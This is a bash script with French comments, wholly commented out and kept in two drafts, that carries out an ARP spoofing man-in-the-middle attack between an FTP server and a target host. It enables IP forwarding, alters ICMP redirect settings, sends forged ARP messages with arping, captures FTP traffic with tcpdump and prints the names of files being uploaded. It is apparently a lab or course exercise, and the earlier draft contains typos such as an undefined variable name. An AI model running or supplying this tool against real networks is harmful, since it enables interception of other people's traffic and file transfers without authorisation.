# # #!/bin/bash

# # # Vérifier le nombre de paramètres
# # if [ $# -ne 4 ]; then
# #     echo "Usage: $0 <ftp_server_ip> <ftp_server_mac> <target_ip> <target_mac>"
# #     exit 1
# # fi

# # # Vérifier le format des paramètres
# # ip_regex="^([0-9]{1,3}\.){3}[0-9]{1,3}$"
# # mac_regex="^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$"

# # # Variables
# # interface="eth0"  # Interface réseau à utiliser
# # capture_file="/tmp/arpspoof_capture.pcap"  # Fichier de capture pcap temporaire
# # ftp_server_ip="$1"
# # ftp_server_mac="$2"
# # target_ip="$3"
# # target_mac="$4"

# # if [[ ! $ftp_server_ip =~ $ip_regex ]]; then
# #     echo "Invalid ftp_server_ip format"
# #     exit 1
# # fi

# # if [[ ! $ftp_server_mac =~ $mac_regex ]]; then
# #     echo "Invalid ftp_server_mac format"
# #     exit 1
# # fi

# # if [[ ! $target_ip =~ $ip_regex ]]; then
# #     echo "Invalid target_ip format"
# #     exit 1
# # fi

# # if [[ ! $target_mac =~ $mac_regex ]]; then
# #     echo "Invalid target_mac format"
# #     exit 1
# # fi

# # touch $capture_file

# # # Fonction pour afficher les noms de fichiers FTP
# # print_ftp_filenames() {
# #     tcpdump -r "$capture_file" -n -q -A 'tcp port 21 and tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x20544553' | grep -oP '(?<=ST ).*'
# # }

# # # Fonction pour restaurer les tables ARP
# # restore_arp_tables() {
# #     arping -c 5 -I "$interface" -s "$target_ip" "$ft_server_ip" #>/dev/null 2>&1
# #     arping -c 5 -I "$interface" -s "$ft_server_ip" "$target_ip" #>/dev/null 2>&1
# #     sleep 1
# #     rm "$capture_file"
# # }

# # # Capture du signal de sortie du script pour restaurer les tables ARP avant de quitter
# # trap restore_arp_tables EXIT

# # # Activation de l'IP forwarding
# # echo 1 > /proc/sys/net/ipv4/ip_forward

# # # Boucle principale pour intercepter les paquets ARP et FTP en continu
# # while true; do
# #     tcpdump -r "$capture_file" -n -q 'tcp port 21'

# #     # Lancement de l'attaque ARP spoofing
# #     echo "0" > /proc/sys/net/ipv4/conf/"$interface"/send_redirects
# #     echo "0" > /proc/sys/net/ipv4/conf/all/send_redirects
# #     echo "0" > /proc/sys/net/ipv4/conf/default/send_redirects

# #     echo "1" > /proc/sys/net/ipv4/conf/"$interface"/accept_redirects
# #     echo "1" > /proc/sys/net/ipv4/conf/all/accept_redirects
# #     echo "1" > /proc/sys/net/ipv4/conf/default/accept_redirects

# #     arping -c 5 -I "$interface" -s "$target_ip" "$ft_server_ip" #>/dev/null 2>&1 &
# #     arping -c 5 -I "$interface" -s "$ft_server_ip" "$target_ip" #>/dev/null 2>&1 &

# #     # Capture des paquets ARP et FTP en utilisant tcpdump
# #     tcpdump -i "$interface" -w "$capture_file" '((arp) or (tcp port 21 and host '"$target_ip"' and host '"$ftp_server_ip"'))' #>/dev/null 2>&1 &

# #     # Attente pour laisser le temps à tcpdump de se lancer
# #     sleep 2

# #     # Affichage des noms de fichiers FTP
# #     print_ftp_filenames

# #     # Attente avant la prochaine itération
# #     sleep 1
# #     tcpdump -r "$capture_file" -n -q 'tcp port 21'

# # done 2>/dev/null



# #!/bin/bash

# # Vérifier le nombre de paramètres
# if [ $# -ne 4 ]; then
#     echo "Usage: $0 <ftp_server_ip> <ftp_server_mac> <target_ip> <target_mac>"
#     exit 1
# fi

# # Vérifier le format des paramètres
# ip_regex="^([0-9]{1,3}\.){3}[0-9]{1,3}$"
# mac_regex="^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$"

# # Variables
# interface="eth0"  # Interface réseau à utiliser
# capture_file="/arpspoof_capture.pcap"  # Fichier de capture pcap temporaire
# ftp_server_ip="$1"
# ftp_server_mac="$2"
# target_ip="$3"
# target_mac="$4"

# if [[ ! $ftp_server_ip =~ $ip_regex ]]; then
#     echo "Invalid ftp_server_ip format"
#     exit 1
# fi

# if [[ ! $ftp_server_mac =~ $mac_regex ]]; then
#     echo "Invalid ftp_server_mac format"
#     exit 1
# fi

# if [[ ! $target_ip =~ $ip_regex ]]; then
#     echo "Invalid target_ip format"
#     exit 1
# fi

# if [[ ! $target_mac =~ $mac_regex ]]; then
#     echo "Invalid target_mac format"
#     exit 1
# fi

# # Fonction pour afficher les noms de fichiers FTP
# print_ftp_filenames() {
#     tcpdump -r "$capture_file" -n -q -A 'tcp port 21 and tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x20544553' | grep -oP '(?<=ST ).*'
# }

# # Fonction pour restaurer les tables ARP
# restore_arp_tables() {
#     arping -c 5 -I "$interface" -s "$target_ip" -S "$target_mac" "$ftp_server_ip" 
#     arping -c 5 -I "$interface" -s "$ftp_server_ip" -S "$ftp_server_mac" "$target_ip" 
#     sleep 1
#     rm "$capture_file"
# }


# # Capture du signal de sortie du script pour restaurer les tables ARP avant de quitter
# trap restore_arp_tables EXIT

# # Activation de l'IP forwarding
# echo 1 > /proc/sys/net/ipv4/ip_forward

# # Lancement de l'attaque ARP spoofing
# echo "0" > /proc/sys/net/ipv4/conf/"$interface"/send_redirects
# echo "0" > /proc/sys/net/ipv4/conf/all/send_redirects
# echo "0" > /proc/sys/net/ipv4/conf/default/send_redirects

# echo "1" > /proc/sys/net/ipv4/conf/"$interface"/accept_redirects
# echo "1" > /proc/sys/net/ipv4/conf/all/accept_redirects
# echo "1" > /proc/sys/net/ipv4/conf/default/accept_redirects

# arping -c 5 -I "$interface" -s "$target_ip" -S "$target_mac" "$ftp_server_ip" #>/dev/null 2>&1 &
# arping -c 5 -I "$interface" -s "$ftp_server_ip" -S "$ftp_server_mac" "$target_ip" #>/dev/null 2>&1 &


# # Capture des paquets ARP et FTP en utilisant tcpdump
# tcpdump -i eth0 -w "$capture_file" '((arp) or (tcp port 21 and host '"$target_ip"' and host '"$ftp_server_ip"'))' #>/dev/null 2>&1 &

# # Attente pour laisser le temps à tcpdump de se lancer
# sleep 2

# # Boucle principale pour intercepter les paquets ARP et FTP en continu
# while true; do
#     # Affichage des noms de fichiers FTP
#     print_ftp_filenames

#     # Attente avant la prochaine itération
#     sleep 1
# done
